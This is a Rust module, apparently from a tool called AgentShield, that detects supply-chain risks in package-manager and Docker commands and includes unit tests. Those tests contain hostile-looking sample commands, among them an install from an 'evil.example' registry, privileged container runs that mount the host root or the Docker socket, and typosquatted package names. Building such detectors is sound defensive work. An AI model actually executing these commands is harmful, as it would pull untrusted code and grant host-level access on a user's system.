//! Supply-chain analysis of package manager commands (static, offline).
//!
//! Recognizes npm, pnpm, Yarn, Bun, pip, uv, Poetry, Composer, Cargo, dotnet, apt, winget,
//! Chocolatey and Docker. Detects: installs from URLs/git, registry overrides
//! (dependency-confusion indicators), typosquatting of popular package names, remote
//! execution of unpinned packages (`npx -y`, `uvx`, `pnpm dlx`), global installs, install
//! scripts, and dangerous container flags.
//!
//! Vulnerability lookups (OSV) are **not** performed here: AgentShield is offline-first.
//! See docs/TECHNICAL_DEBT.md for the planned opt-in OSV module.

use agentshield_command_parser::Segment;
use agentshield_event_model::{Confidence, Finding, RiskCategory};
use serde::Serialize;

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum PackageSource {
    Registry,
    Git,
    Url,
    LocalPath,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct PackageRef {
    pub name: String,
    pub version: Option<String>,
    pub source: PackageSource,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Operation {
    Install,
    Add,
    Update,
    Remove,
    /// Download-and-run (npx, pnpm dlx, uvx, ...).
    Execute,
    /// Install everything from the lock/manifest file.
    Restore,
    Pull,
    Run,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct PackageAction {
    pub manager: &'static str,
    pub ecosystem: &'static str,
    pub operation: Operation,
    pub packages: Vec<PackageRef>,
    pub registry_override: Option<String>,
    pub global: bool,
    pub ignore_scripts: bool,
    pub flags: Vec<String>,
}

fn op_for(word: &str) -> Option<Operation> {
    Some(match word {
        "install" | "i" | "in" | "ins" | "inst" | "insta" | "instal" | "isntall" => {
            Operation::Install
        }
        "add" | "require" => Operation::Add,
        "update" | "upgrade" | "up" => Operation::Update,
        "remove" | "rm" | "uninstall" | "un" | "purge" => Operation::Remove,
        "ci" | "sync" => Operation::Restore,
        "dlx" | "exec" | "x" => Operation::Execute,
        _ => return None,
    })
}

/// Detect a package manager action in a single command segment.
pub fn detect(seg: &Segment) -> Option<PackageAction> {
    let p = seg.program.as_str();
    let args: Vec<&str> = seg.args.iter().map(|s| s.as_str()).collect();
    let lower: Vec<String> = seg.args_lower();
    let first = lower.first().map(|s| s.as_str()).unwrap_or("");
    let act = |manager: &'static str,
               ecosystem: &'static str,
               operation: Operation,
               pkg_args: &[&str]| {
        let mut packages = Vec::new();
        let mut registry = None;
        let mut flags = Vec::new();
        let mut skip_next = false;
        for (i, a) in pkg_args.iter().enumerate() {
            if skip_next {
                skip_next = false;
                continue;
            }
            let la = a.to_ascii_lowercase();
            if a.starts_with('-') {
                flags.push(la.clone());
                let value_flags = [
                    "--registry",
                    "--index-url",
                    "-i",
                    "--extra-index-url",
                    "--trusted-host",
                    "--source",
                    "-s",
                    "--repository",
                    "--index",
                    "--default-index",
                    "--git",
                    "--path",
                    "--version",
                    "-v",
                    "--target",
                    "-t",
                    "--prefix",
                ];
                if let Some((k, v)) = la.split_once('=') {
                    if matches!(
                        k,
                        "--registry"
                            | "--index-url"
                            | "--extra-index-url"
                            | "--source"
                            | "--index"
                            | "--default-index"
                            | "--trusted-host"
                    ) {
                        registry = Some(format!("{k}={v}"));
                    }
                } else if value_flags.contains(&la.as_str()) {
                    let v = pkg_args.get(i + 1).copied().unwrap_or("");
                    if matches!(
                        la.as_str(),
                        "--registry"
                            | "--index-url"
                            | "--extra-index-url"
                            | "--source"
                            | "--index"
                            | "--default-index"
                            | "--trusted-host"
                    ) || (la == "-i" && ecosystem == "pypi")
                        || (la == "-s" && ecosystem == "nuget")
                    {
                        registry = Some(format!("{la} {v}"));
                    }
                    if la == "--git" {
                        packages.push(PackageRef {
                            name: v.to_string(),
                            version: None,
                            source: PackageSource::Git,
                        });
                    }
                    skip_next = true;
                }
                continue;
            }
            if ecosystem == "pypi" && (la == "-r" || la.ends_with(".txt")) {
                continue;
            }
            packages.push(parse_pkg(a, ecosystem));
        }
        let global = flags.iter().any(|f| {
            matches!(
                f.as_str(),
                "-g" | "--global" | "--location=global" | "--user"
            )
        }) || (manager == "cargo" && operation == Operation::Install)
            || (manager == "dotnet" && flags.iter().any(|f| f == "-g" || f == "--global"));
        let ignore_scripts = flags
            .iter()
            .any(|f| f == "--ignore-scripts" || f == "--no-scripts");
        Some(PackageAction {
            manager,
            ecosystem,
            operation,
            packages,
            registry_override: registry,
            global,
            ignore_scripts,
            flags,
        })
    };
    match p {
        "npm" | "pnpm" | "yarn" | "bun" | "cnpm" => {
            let manager: &'static str = match p {
                "npm" => "npm",
                "pnpm" => "pnpm",
                "yarn" => "yarn",
                "bun" => "bun",
                _ => "cnpm",
            };
            // `yarn` alone restores.
            if args.is_empty() && manager == "yarn" {
                return act(manager, "npm", Operation::Restore, &[]);
            }
            let op = op_for(first)?;
            let op = if matches!(op, Operation::Install) && args.len() == 1 {
                Operation::Restore
            } else {
                op
            };
            act(manager, "npm", op, &args[1..])
        }
        "npx" | "bunx" => {
            let start = args
                .iter()
                .position(|a| !a.starts_with('-'))
                .unwrap_or(args.len());
            let pkg: Vec<&str> = args.get(start).copied().into_iter().collect();
            let mut r = act(
                if p == "npx" { "npx" } else { "bunx" },
                "npm",
                Operation::Execute,
                &pkg,
            )?;
            r.flags = lower[..start].to_vec();
            Some(r)
        }
        "pip" | "pip3" | "pipx" => {
            let op = op_for(first)?;
            act(
                if p == "pipx" { "pipx" } else { "pip" },
                "pypi",
                op,
                &args[1..],
            )
        }
        "python" | "python3" | "py"
            if lower.len() >= 3 && lower[0] == "-m" && lower[1].starts_with("pip") =>
        {
            let op = op_for(&lower[2])?;
            act("pip", "pypi", op, &args[3..])
        }
        "uv" => {
            if first == "pip" && lower.len() >= 2 {
                let op = op_for(&lower[1])?;
                return act("uv", "pypi", op, &args[2..]);
            }
            if first == "tool" && lower.get(1).map(|s| s.as_str()) == Some("run") {
                return act(
                    "uv",
                    "pypi",
                    Operation::Execute,
                    &args[2..args.len().min(3)],
                );
            }
            let op = op_for(first)?;
            act("uv", "pypi", op, &args[1..])
        }
        "uvx" | "pipx-run" => {
            let start = args
                .iter()
                .position(|a| !a.starts_with('-'))
                .unwrap_or(args.len());
            let pkg: Vec<&str> = args.get(start).copied().into_iter().collect();
            act("uvx", "pypi", Operation::Execute, &pkg)
        }
        "poetry" => {
            let op = op_for(first)?;
            let op = if op == Operation::Install {
                Operation::Restore
            } else {
                op
            };
            act("poetry", "pypi", op, &args[1..])
        }
        "composer" => {
            let op = op_for(first)?;
            let op = if op == Operation::Install {
                Operation::Restore
            } else {
                op
            };
            act("composer", "packagist", op, &args[1..])
        }
        "cargo" => {
            let op = match first {
                "add" => Operation::Add,
                "install" => Operation::Install,
                "update" => Operation::Update,
                "remove" | "rm" => Operation::Remove,
                "binstall" => Operation::Install,
                _ => return None,
            };
            act("cargo", "crates.io", op, &args[1..])
        }
        "dotnet" => {
            if first == "add" && lower.get(1).map(|s| s.as_str()) == Some("package") {
                return act("dotnet", "nuget", Operation::Add, &args[2..]);
            }
            if first == "tool" && lower.get(1).map(|s| s.as_str()) == Some("install") {
                return act("dotnet", "nuget", Operation::Install, &args[2..]);
            }
            if first == "restore" {
                return act("dotnet", "nuget", Operation::Restore, &[]);
            }
            None
        }
        "nuget" if first == "install" => act("nuget", "nuget", Operation::Install, &args[1..]),
        "apt" | "apt-get" | "aptitude" | "dnf" | "yum" | "zypper" | "pacman" | "snap"
        | "flatpak" | "brew" => {
            let op = if p == "pacman" {
                if lower.iter().any(|a| a.starts_with("-s")) {
                    Operation::Install
                } else {
                    return None;
                }
            } else {
                op_for(first)?
            };
            let rest: &[&str] = if p == "pacman" { &args[..] } else { &args[1..] };
            let manager: &'static str = match p {
                "apt" | "apt-get" | "aptitude" => "apt",
                "dnf" | "yum" => "dnf",
                "zypper" => "zypper",
                "pacman" => "pacman",
                "snap" => "snap",
                "flatpak" => "flatpak",
                _ => "brew",
            };
            act(manager, "system", op, rest)
        }
        "winget" => {
            let op = op_for(first)?;
            act("winget", "system", op, &args[1..])
        }
        "choco" | "chocolatey" | "scoop" => {
            let op = op_for(first)?;
            act(
                if p == "scoop" { "scoop" } else { "choco" },
                "system",
                op,
                &args[1..],
            )
        }
        "gem" if first == "install" => act("gem", "rubygems", Operation::Install, &args[1..]),
        "go" if first == "install" || first == "get" => {
            act("go", "go", Operation::Install, &args[1..])
        }
        "docker" | "podman" => {
            let op = match first {
                "pull" => Operation::Pull,
                "run" | "create" => Operation::Run,
                _ => return None,
            };
            // image = first positional after options for run; skip option values roughly
            let mut image = None;
            let mut i = 1;
            while i < args.len() {
                let a = args[i];
                if a.starts_with('-') {
                    let takes_value = !a.contains('=')
                        && matches!(
                            a,
                            "-v" | "--volume"
                                | "-e"
                                | "--env"
                                | "-p"
                                | "--publish"
                                | "--name"
                                | "-w"
                                | "--workdir"
                                | "--network"
                                | "--net"
                                | "-u"
                                | "--user"
                                | "--entrypoint"
                                | "--mount"
                                | "--env-file"
                                | "-l"
                                | "--label"
                                | "--platform"
                                | "--cap-add"
                                | "--pid"
                                | "--ipc"
                        );
                    i += if takes_value { 2 } else { 1 };
                    continue;
                }
                image = Some(a);
                break;
            }
            let pkgs: Vec<&str> = image.into_iter().collect();
            let mut r = act("docker", "container", op, &pkgs)?;
            r.flags = lower.clone();
            Some(r)
        }
        _ => None,
    }
}

fn parse_pkg(a: &str, ecosystem: &str) -> PackageRef {
    let la = a.to_ascii_lowercase();
    if la.starts_with("git+")
        || la.starts_with("git@")
        || la.starts_with("github:")
        || la.ends_with(".git")
        || la.contains("github.com/") && !la.starts_with("http")
    {
        return PackageRef {
            name: a.to_string(),
            version: None,
            source: PackageSource::Git,
        };
    }
    if la.starts_with("http://") || la.starts_with("https://") || la.starts_with("ftp://") {
        return PackageRef {
            name: a.to_string(),
            version: None,
            source: PackageSource::Url,
        };
    }
    if la.starts_with("./")
        || la.starts_with("../")
        || la.starts_with('/')
        || la.starts_with("file:")
        || la.ends_with(".tgz")
        || la.ends_with(".whl")
        || (la.len() > 2 && la.as_bytes()[1] == b':')
    {
        return PackageRef {
            name: a.to_string(),
            version: None,
            source: PackageSource::LocalPath,
        };
    }
    let (name, version) = match ecosystem {
        "npm" => {
            // @scope/name@1.2.3 or name@1.2.3
            let body = a.strip_prefix('@').map(|r| (true, r)).unwrap_or((false, a));
            match body.1.rsplit_once('@') {
                Some((n, v)) => (
                    if body.0 {
                        format!("@{n}")
                    } else {
                        n.to_string()
                    },
                    Some(v.to_string()),
                ),
                None => (a.to_string(), None),
            }
        }
        "pypi" => {
            let idx = a.find(['=', '<', '>', '~', '!', '[', ';']);
            match idx {
                Some(i) => (
                    a[..i].to_string(),
                    Some(a[i..].trim_start_matches(['=']).to_string()),
                ),
                None => (a.to_string(), None),
            }
        }
        "packagist" | "crates.io" | "container" | "go" => match a.split_once([':', '@']) {
            Some((n, v)) if !n.is_empty() => (n.to_string(), Some(v.to_string())),
            _ => (a.to_string(), None),
        },
        _ => (a.to_string(), None),
    };
    PackageRef {
        name,
        version: version.filter(|v| !v.is_empty()),
        source: PackageSource::Registry,
    }
}

const POPULAR_NPM: &[&str] = &[
    "react",
    "react-dom",
    "lodash",
    "express",
    "axios",
    "chalk",
    "commander",
    "typescript",
    "webpack",
    "vite",
    "eslint",
    "prettier",
    "jest",
    "vitest",
    "moment",
    "dayjs",
    "next",
    "vue",
    "svelte",
    "tailwindcss",
    "postcss",
    "dotenv",
    "uuid",
    "debug",
    "request",
    "yargs",
    "rimraf",
    "glob",
    "minimist",
    "cross-env",
    "nodemon",
    "mongoose",
    "redux",
    "jquery",
    "bootstrap",
    "electron",
    "esbuild",
    "rollup",
    "babel-core",
    "@babel/core",
    "core-js",
    "socket.io",
    "body-parser",
    "cors",
    "jsonwebtoken",
    "bcrypt",
    "sharp",
    "puppeteer",
    "playwright",
    "zod",
    "zustand",
    "laravel-vite-plugin",
    "colors",
    "node-fetch",
];
const POPULAR_PYPI: &[&str] = &[
    "requests",
    "numpy",
    "pandas",
    "django",
    "flask",
    "fastapi",
    "pytest",
    "urllib3",
    "setuptools",
    "boto3",
    "botocore",
    "pyyaml",
    "cryptography",
    "scipy",
    "matplotlib",
    "pillow",
    "sqlalchemy",
    "pydantic",
    "jinja2",
    "click",
    "beautifulsoup4",
    "selenium",
    "tensorflow",
    "torch",
    "scikit-learn",
    "openai",
    "anthropic",
    "httpx",
    "uvicorn",
    "black",
    "colorama",
    "python-dateutil",
    "six",
    "certifi",
    "idna",
    "packaging",
    "rich",
];
const POPULAR_CRATES: &[&str] = &[
    "serde",
    "serde_json",
    "tokio",
    "rand",
    "clap",
    "regex",
    "anyhow",
    "thiserror",
    "log",
    "tracing",
    "reqwest",
    "hyper",
    "chrono",
    "futures",
    "syn",
    "quote",
    "proc-macro2",
    "itertools",
    "once_cell",
    "lazy_static",
    "bytes",
    "libc",
    "rayon",
    "uuid",
    "base64",
];
const POPULAR_PACKAGIST: &[&str] = &[
    "laravel/framework",
    "laravel/sanctum",
    "laravel/breeze",
    "guzzlehttp/guzzle",
    "symfony/console",
    "monolog/monolog",
    "phpunit/phpunit",
    "pestphp/pest",
    "spatie/laravel-permission",
    "livewire/livewire",
    "filament/filament",
    "doctrine/dbal",
    "nesbot/carbon",
    "vlucas/phpdotenv",
    "league/flysystem",
];

/// Damerau-Levenshtein distance (optimal string alignment; adjacent transpositions count 1).
pub fn levenshtein(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    let (n, m) = (a.len(), b.len());
    let mut d = vec![vec![0usize; m + 1]; n + 1];
    for (i, row) in d.iter_mut().enumerate() {
        row[0] = i;
    }
    for (j, cell) in d[0].iter_mut().enumerate() {
        *cell = j;
    }
    for i in 1..=n {
        for j in 1..=m {
            let cost = usize::from(a[i - 1] != b[j - 1]);
            let mut v = (d[i - 1][j] + 1)
                .min(d[i][j - 1] + 1)
                .min(d[i - 1][j - 1] + cost);
            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                v = v.min(d[i - 2][j - 2] + 1);
            }
            d[i][j] = v;
        }
    }
    d[n][m]
}

/// If `name` looks like a typo of a popular package, return that package.
pub fn typosquat_of(name: &str, ecosystem: &str) -> Option<&'static str> {
    let list: &[&str] = match ecosystem {
        "npm" => POPULAR_NPM,
        "pypi" => POPULAR_PYPI,
        "crates.io" => POPULAR_CRATES,
        "packagist" => POPULAR_PACKAGIST,
        _ => return None,
    };
    let norm = |s: &str| s.to_ascii_lowercase().replace(['_', '.'], "-");
    let n = norm(name);
    if n.len() < 4 || list.iter().any(|p| norm(p) == n) {
        return None;
    }
    list.iter().copied().find(|p| {
        let pn = norm(p);
        let d = levenshtein(&n, &pn);
        let limit = if pn.len() >= 8 { 2 } else { 1 };
        d > 0 && d <= limit
            // common squatting tricks: suffixes like -js / js / 2 on a popular name
            || n == format!("{pn}-js") || n == format!("{pn}js") || n == format!("{pn}2") || n == format!("{pn}-dev")
    })
}

/// Risk findings for a package action.
pub fn assess(a: &PackageAction) -> Vec<Finding> {
    let mut f = Vec::new();
    let mut add = |id: &str,
                   cat: RiskCategory,
                   score: u8,
                   conf: Confidence,
                   expl: String,
                   ev: Option<String>,
                   mit: Option<&str>| {
        f.push(Finding {
            id: id.into(),
            category: cat,
            score,
            confidence: conf,
            explanation: expl,
            evidence: ev,
            mitigation: mit.map(Into::into),
        });
    };
    let names: Vec<String> = a.packages.iter().map(|p| p.name.clone()).collect();
    if matches!(
        a.operation,
        Operation::Install
            | Operation::Add
            | Operation::Update
            | Operation::Execute
            | Operation::Restore
            | Operation::Pull
            | Operation::Run
    ) {
        add(
            "supply.package_action",
            RiskCategory::SuspiciousPackageInstallation,
            20,
            Confidence::High,
            format!(
                "{} {:?}: dependency change via {}",
                a.manager, a.operation, a.ecosystem
            )
            .to_lowercase(),
            (!names.is_empty()).then(|| names.join(", ")),
            None,
        );
    }
    for p in &a.packages {
        match p.source {
            PackageSource::Git | PackageSource::Url => add(
                "supply.non_registry_source",
                RiskCategory::SupplyChainCompromise,
                55,
                Confidence::High,
                format!(
                    "Package installed directly from a {} instead of the registry; no registry integrity guarantees",
                    if p.source == PackageSource::Git {
                        "git repository"
                    } else {
                        "URL"
                    }
                ),
                Some(p.name.clone()),
                Some(
                    "Install a pinned, published version from the official registry, or vendor and review the code first.",
                ),
            ),
            _ => {}
        }
        if p.source == PackageSource::Registry
            && let Some(real) = typosquat_of(&p.name, a.ecosystem)
        {
            add(
                "supply.typosquat",
                RiskCategory::SuspiciousPackageInstallation,
                72,
                Confidence::Medium,
                format!(
                    "Package name '{}' is very similar to the popular package '{real}' (possible typosquatting)",
                    p.name
                ),
                Some(p.name.clone()),
                Some("Double-check the package name and publisher before installing."),
            );
        }
    }
    if let Some(r) = &a.registry_override {
        let extra = r.contains("extra-index-url") || r.contains("trusted-host");
        add(
            if extra {
                "supply.dependency_confusion"
            } else {
                "supply.registry_override"
            },
            RiskCategory::SupplyChainCompromise,
            if extra { 65 } else { 50 },
            Confidence::High,
            if extra {
                "Additional package index / trusted host: classic dependency-confusion vector (package may be resolved from an unexpected index)".into()
            } else {
                "Package registry overridden on the command line".into()
            },
            Some(r.clone()),
            Some("Use a scoped registry configuration in the project instead of an ad-hoc index."),
        );
    }
    if a.operation == Operation::Execute {
        let unpinned = a.packages.iter().any(|p| p.version.is_none());
        let auto_yes = a.flags.iter().any(|f| f == "-y" || f == "--yes");
        if unpinned || auto_yes {
            add(
                "supply.remote_execute_unpinned",
                RiskCategory::SupplyChainCompromise,
                if auto_yes { 50 } else { 45 },
                Confidence::High,
                "Downloads and runs a package in one step without a pinned version".into(),
                (!names.is_empty()).then(|| names.join(", ")),
                Some(
                    "Pin the version (e.g. pkg@1.2.3) and review the package before executing it.",
                ),
            );
        }
    }
    if a.global && matches!(a.operation, Operation::Install | Operation::Add) {
        add(
            "supply.global_install",
            RiskCategory::SuspiciousPackageInstallation,
            35,
            Confidence::High,
            "Global / user-wide installation affects every project on this machine".into(),
            (!names.is_empty()).then(|| names.join(", ")),
            Some("Prefer a project-local dependency."),
        );
    }
    if a.ecosystem == "npm"
        && matches!(
            a.operation,
            Operation::Install | Operation::Add | Operation::Restore
        )
        && !a.ignore_scripts
    {
        add(
            "supply.install_scripts",
            RiskCategory::SupplyChainCompromise,
            25,
            Confidence::Medium,
            "npm-compatible installs run package lifecycle scripts (preinstall/postinstall) with your user rights".into(),
            None,
            Some("Use --ignore-scripts for untrusted packages."),
        );
    }
    if a.ecosystem == "system" && matches!(a.operation, Operation::Install | Operation::Add) {
        add(
            "supply.system_package",
            RiskCategory::SuspiciousPackageInstallation,
            40,
            Confidence::High,
            format!("System-wide software installation via {}", a.manager),
            (!names.is_empty()).then(|| names.join(", ")),
            Some("Install system software yourself after reviewing it."),
        );
    }
    if a.ecosystem == "container" {
        let fl = &a.flags;
        let privileged = fl.iter().any(|x| {
            x == "--privileged"
                || x.starts_with("--cap-add")
                || x == "--pid=host"
                || x == "--net=host"
                || x == "--network=host"
        });
        let host_mount = fl.windows(2).any(|w| {
            (w[0] == "-v" || w[0] == "--volume")
                && (w[1].starts_with("/:")
                    || w[1].contains("docker.sock")
                    || w[1].starts_with("c:\\:")
                    || w[1].starts_with("/etc"))
        }) || fl.iter().any(|x| x.contains("docker.sock"));
        if privileged || host_mount {
            add(
                "supply.container_escape_flags",
                RiskCategory::PrivilegeEscalation,
                75,
                Confidence::High,
                "Container started with privileged flags or host filesystem/Docker socket mounted: equivalent to host root access".into(),
                None,
                Some("Run containers unprivileged and mount only the project directory."),
            );
        }
        let unpinned = a
            .packages
            .iter()
            .any(|p| p.version.is_none() || p.version.as_deref() == Some("latest"));
        if unpinned {
            add(
                "supply.container_unpinned",
                RiskCategory::SupplyChainCompromise,
                30,
                Confidence::Medium,
                "Container image without a pinned tag/digest".into(),
                (!names.is_empty()).then(|| names.join(", ")),
                Some("Pin images by digest (image@sha256:...)."),
            );
        }
    }
    f
}

#[cfg(test)]
mod tests {
    use super::*;
    use agentshield_command_parser::parse;
    use agentshield_event_model::ShellKind;

    fn first(cmd: &str) -> Option<PackageAction> {
        parse(cmd, ShellKind::Bash)
            .all_segments()
            .iter()
            .find_map(|s| detect(s))
    }
    fn ids(cmd: &str) -> Vec<String> {
        first(cmd)
            .map(|a| assess(&a).into_iter().map(|f| f.id).collect())
            .unwrap_or_default()
    }

    #[test]
    fn npm_install_detected() {
        let a = first("npm install lodash@4.17.21 @types/node --save-dev").unwrap();
        assert_eq!(a.manager, "npm");
        assert_eq!(a.packages[0].name, "lodash");
        assert_eq!(a.packages[0].version.as_deref(), Some("4.17.21"));
        assert_eq!(a.packages[1].name, "@types/node");
        assert!(ids("npm install lodash").contains(&"supply.install_scripts".to_string()));
        assert!(
            !ids("npm install --ignore-scripts lodash")
                .contains(&"supply.install_scripts".to_string())
        );
    }

    #[test]
    fn restore_without_packages() {
        assert_eq!(first("npm install").unwrap().operation, Operation::Restore);
        assert_eq!(
            first("composer install").unwrap().operation,
            Operation::Restore
        );
        assert_eq!(first("npm ci").unwrap().operation, Operation::Restore);
    }

    #[test]
    fn typosquats() {
        assert_eq!(typosquat_of("reqeusts", "pypi"), Some("requests"));
        assert_eq!(typosquat_of("lodahs", "npm"), Some("lodash"));
        assert_eq!(typosquat_of("expresss", "npm"), Some("express"));
        assert_eq!(typosquat_of("requests", "pypi"), None);
        assert_eq!(typosquat_of("left-pad", "npm"), None);
        assert!(ids("pip install reqeusts").contains(&"supply.typosquat".to_string()));
    }

    #[test]
    fn dependency_confusion_and_sources() {
        assert!(
            ids("pip install --extra-index-url https://pkgs.example/simple internal-lib")
                .contains(&"supply.dependency_confusion".to_string())
        );
        assert!(
            ids("npm install --registry=https://evil.example lodash")
                .contains(&"supply.registry_override".to_string())
        );
        assert!(
            ids("pip install git+https://github.com/x/y.git")
                .contains(&"supply.non_registry_source".to_string())
        );
        assert!(
            ids("npm i https://x.example/pkg.tgz")
                .contains(&"supply.non_registry_source".to_string())
        );
    }

    #[test]
    fn python_m_pip_and_uv() {
        assert_eq!(
            first("python -m pip install flask").unwrap().packages[0].name,
            "flask"
        );
        assert_eq!(
            first("uv pip install 'httpx==0.27'").unwrap().packages[0].name,
            "httpx"
        );
        assert_eq!(first("uv add rich").unwrap().manager, "uv");
    }

    #[test]
    fn remote_execute() {
        assert!(
            ids("npx -y create-something").contains(&"supply.remote_execute_unpinned".to_string())
        );
        assert!(
            !ids("npx create-vite@5.2.0").contains(&"supply.remote_execute_unpinned".to_string())
        );
    }

    #[test]
    fn cargo_composer_dotnet_system() {
        assert!(ids("cargo install ripgrep").contains(&"supply.global_install".to_string()));
        assert_eq!(
            first("composer require laravel/sanctum:^4.0")
                .unwrap()
                .packages[0]
                .name,
            "laravel/sanctum"
        );
        assert_eq!(
            first("dotnet add package Newtonsoft.Json")
                .unwrap()
                .ecosystem,
            "nuget"
        );
        assert!(ids("sudo apt-get install -y nmap").contains(&"supply.system_package".to_string()));
        assert!(ids("winget install Git.Git").contains(&"supply.system_package".to_string()));
    }

    #[test]
    fn docker_flags() {
        assert!(
            ids("docker run --privileged -v /:/host alpine")
                .contains(&"supply.container_escape_flags".to_string())
        );
        assert!(
            ids("docker run -v /var/run/docker.sock:/var/run/docker.sock alpine:3.20")
                .contains(&"supply.container_escape_flags".to_string())
        );
        assert!(ids("docker pull nginx").contains(&"supply.container_unpinned".to_string()));
        assert!(
            !ids("docker run --rm alpine:3.20 echo hi")
                .contains(&"supply.container_escape_flags".to_string())
        );
    }

    #[test]
    fn non_package_commands() {
        assert!(first("git status").is_none());
        assert!(first("npm run build").is_none());
        assert!(first("cargo build").is_none());
    }

    #[test]
    fn lev() {
        assert_eq!(levenshtein("kitten", "sitting"), 3);
        assert_eq!(levenshtein("", "abc"), 3);
        assert_eq!(levenshtein("lodahs", "lodash"), 1);
    }
}
